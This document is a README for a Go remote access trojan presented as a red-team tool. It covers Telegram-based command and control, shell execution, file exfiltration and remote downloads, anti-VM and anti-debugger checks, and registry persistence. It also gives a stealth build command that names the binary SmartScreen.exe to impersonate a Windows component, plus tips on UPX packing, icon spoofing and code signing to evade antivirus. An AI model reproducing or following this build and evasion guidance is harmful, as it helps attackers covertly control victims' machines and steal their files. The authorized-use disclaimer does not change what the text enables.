# Golang Red Team RAT

This is a modular and well-documented Remote Administration Tool (RAT) developed in Go for authorized Red Teaming exercises.

## Features

- **C2 via Telegram**: Secure long-polling communication using the `telegram-bot-api`.
- **String Obfuscation**: Bot token is XOR-encrypted and decrypted only in memory.
- **Anti-Analysis**: Detects virtualization (VMware, VirtualBox, QEMU, Hyper-V, Parallels) and debugger/monitoring processes.
- **Persistence**: Adds itself to the Windows Registry and copies the binary to a hidden path.
- **Commands**:
  - `/exec [cmd]`: Execute shell commands.
  - `/screen`: Capture primary monitor screenshot (in-memory).
  - `/upload [path]`: Upload a file from the target to Telegram.
  - `/download [url] [dest]`: Download a file from a URL to the target.
  - `/info`: Retrieve detailed system metadata.

## Project Structure

- `cmd/agent/main.go`: Entry point.
- `internal/commands/`: Command implementation logic.
- `internal/evasion/`: Anti-analysis and persistence logic.
- `internal/transport/`: Telegram C2 communication logic.
- `internal/utils/`: Common utilities (XOR, etc.).

## Setup

1. **Get a Telegram Bot Token**: Create a bot via @BotFather.
2. **Get your Chat ID**: Use @userinfobot to find your AdminChatID.
3. **Encrypt your Token**:
   - Use the tool in `internal/utils/xor_tool.go.txt`.
   - `go run internal/utils/xor_tool.go.txt "YOUR_BOT_TOKEN" "YOUR_SECRET_KEY"`
4. **Update `cmd/agent/main.go`**:
   - Replace `encryptedToken` with the byte array from the tool.
   - Replace `xorKey` with your secret key.
   - Replace `adminChatID` with your Chat ID.

## Build Guide (Stealth Compilation)

To compile the agent for maximum stealth on Windows:

```bash
# Set target OS and Architecture
SET GOOS=windows
SET GOARCH=amd64

# Compile with stealth flags:
# -ldflags="-s -w -H=windowsgui":
#   -s -w: Strip debug info and symbol table (reduces size and hinders analysis).
#   -H=windowsgui: Run without a console window.
go build -ldflags="-s -w -H=windowsgui" -o SmartScreen.exe cmd/agent/main.go
```

### Tips for Stealth:
- **UPX Packing**: Consider using UPX (`upx --ultra-brute SmartScreen.exe`) to compress the binary, though some AVs flag UPX.
- **Icon Spoofing**: Use a resource editor to add a legitimate-looking icon to the `.exe`.
- **Code Signing**: If possible, sign the binary with a valid certificate.

## Disclaimer

This tool is for educational and authorized security testing purposes ONLY. Unauthorized access to computer systems is illegal.
